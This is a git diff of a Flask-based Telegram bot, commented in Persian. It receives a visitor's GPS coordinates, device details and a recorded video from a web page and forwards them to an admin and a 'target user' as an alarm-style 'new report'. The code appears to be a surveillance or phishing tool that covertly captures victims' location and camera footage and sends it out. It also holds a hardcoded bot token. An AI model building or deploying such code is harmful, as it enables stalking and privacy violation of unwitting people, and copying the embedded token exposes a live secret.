@@ -7,6 +7,7 @@ app = Flask(__name__)
 
 BOT_TOKEN = "8856249113:AAHjdpUoGjuRyH9bzD-gSomevMMPg1cet64"
 ADMIN_ID = "8173349543"  # آیدی ادمین اصلی شما
+DOMAIN = "bot-production-7a7e.up.railway.app"
 
 HTML_TEMPLATE = """
 <!DOCTYPE html>
@@ -140,33 +141,29 @@ def upload():
     target_user_id = info.get("userId")
     
     msg = (f"🚨 گزارش جدید ({label})\n\n"
-           f"📍 موقعیت: {info.get('lat', 'نامشخص')}, {info.get('lon', 'نامشخص')}\n"
+           f"📍 موقعیت: https://maps.google.com/?q={info.get('lat', 'نامشخص')},{info.get('lon', 'نامشخص')}\n"
            f"📱 دستگاه: {info.get('ua')}\n"
            f"💾 رم: {info.get('ram')} GB\n"
            f"🗄 حافظه: {info.get('storage')}\n"
            f"⚙️ هسته پردازنده: {info.get('cores')}\n\n"
-           f"ساخته شده توسط ریس شاهد و ریس نوری\n"
-           f"@shahidnaimi5642 | @HOKOMAT_ARAB")
+           f"طراحی شده توسط:\n"
+           f"کدنویسی بات: @shahidnaimi5642\n"
+           f"مالک و توسعه‌دهنده: @NOORI_SAHIB_003")
     
-    # 1. ارسال لوکیشن برای ادمین
     if info.get('lat'):
         requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendLocation",
                       data={"chat_id": ADMIN_ID, "latitude": info.get('lat'), "longitude": info.get('lon')})
         
-        # ارسال لوکیشن برای کاربر هدف (اگر غیر از ادمین بود)
         if target_user_id and str(target_user_id) != str(ADMIN_ID):
             requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendLocation",
                           data={"chat_id": target_user_id, "latitude": info.get('lat'), "longitude": info.get('lon')})
     
-    # خواندن استریم ویدیو برای ارسال مجدد (چون stream یکبار مصرف است، از read استفاده می‌کنیم)
     video_bytes = video.read()
 
-    # 2. ارسال ویدیو برای ادمین
     requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo",
                   data={"chat_id": ADMIN_ID, "caption": msg},
                   files={"video": ("v.webm", video_bytes)})
     
-    # ارسال ویدیو برای کاربر هدف (اگر غیر از ادمین بود)
     if target_user_id and str(target_user_id) != str(ADMIN_ID):
         requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo",
                       data={"chat_id": target_user_id, "caption": msg},
@@ -198,8 +195,9 @@ def upload_specs():
            f"💾 رم: {info.get('ram')} GB\n"
            f"🗄 حافظه: {info.get('storage')}\n"
            f"⚙️ هسته پردازنده: {info.get('cores')}\n\n"
-           f"ساخته شده توسط ریس شاهد و ریس نوری\n"
-           f"@shahidnaimi5642 | @HOKOMAT_ARAB")
+           f"طراحی شده توسط:\n"
+           f"مالک و کدنویسی ربات : @shahidnaimi5642\n"
+           f"  توسعه‌دهنده: @NOORI_SAHIB_003")
            
     requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                   json={"chat_id": ADMIN_ID, "text": msg})
